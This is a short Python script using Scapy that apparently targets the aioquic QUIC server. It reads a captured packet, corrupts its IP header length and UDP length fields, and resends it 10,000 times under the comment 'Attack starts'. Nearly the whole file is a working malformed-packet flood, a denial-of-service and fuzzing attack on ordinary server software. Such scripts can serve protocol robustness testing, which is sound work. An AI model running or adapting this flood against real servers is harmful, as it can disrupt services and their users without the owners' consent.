# Server : Aioquic
# Link : https://pgjones.dev/

from scapy.all import *

packetCollection = rdpcap("packet.pcapng")
packet = packetCollection[0]

# Changes applied

packet[IP].ihl = 10000
packet[UDP].len = 10
packet[IP].id = 2120

packet.show()

# Attack starts

cnt=1

while cnt <= 10000:
    sendp(packet)
    cnt = cnt + 1
